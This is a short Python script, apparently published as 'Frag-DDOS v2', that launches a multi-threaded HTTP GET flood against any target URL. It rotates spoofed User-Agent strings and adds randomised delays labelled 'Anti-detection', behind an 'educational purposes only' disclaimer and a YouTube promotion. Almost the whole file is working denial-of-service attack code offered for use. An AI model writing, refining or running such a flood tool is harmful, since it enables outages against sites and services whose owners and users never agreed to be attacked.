import requests
import threading
import argparse
import time
import random

# ────── Disclaimer Prompt ────── #
disclaimer = """
╔═══════════════════════════════════════════════════════════════════╗
║                     ⚠️  DISCLAIMER NOTICE ⚠️                       ║
╠═══════════════════════════════════════════════════════════════════╣
║ This tool is for educational purposes ONLY.                       ║
║                                                                   ║
║ Do NOT use this to attack websites, servers, or devices           ║
║ you do not own or have explicit permission to test.               ║
║                                                                   ║
║ The developer is NOT responsible for misuse, damage, legal        ║
║ issues, or anything dumb you do with this code.                   ║
╚═══════════════════════════════════════════════════════════════════╝

💥 Want more tools? Subscribe to:
📺 https://www.youtube.com/@frag-inc
Press ENTER to accept and continue...
"""
print(disclaimer)
input()

# ────── Argparse Setup ────── #
parser = argparse.ArgumentParser(description="Frag-DDOS v2")
parser.add_argument("url", help="Target URL (e.g., http://example.com)")
parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default=10)")
args = parser.parse_args()

# ────── Optional User-Agent Spoofing ────── #
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X)"
]

def attack(url):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents)
            }
            response = requests.get(url, headers=headers)
            print(f"[+] Sent => {url} | Status: {response.status_code}")
            time.sleep(random.uniform(0.3, 1.5))  # Anti-detection delay
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed: {e}")
        except KeyboardInterrupt:
            print("[!] Attack stopped by user.")
            break

# ────── Launch Threads ────── #
for _ in range(args.threads):
    t = threading.Thread(target=attack, args=(args.url,))
    t.daemon = True
    t.start()

print(f"\n🚀 Frag-DDOS v2 attack started on {args.url} with {args.threads} threads.")
print("🔒 Press CTRL+C to stop...\n")

while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping attack. Exiting...")
        break
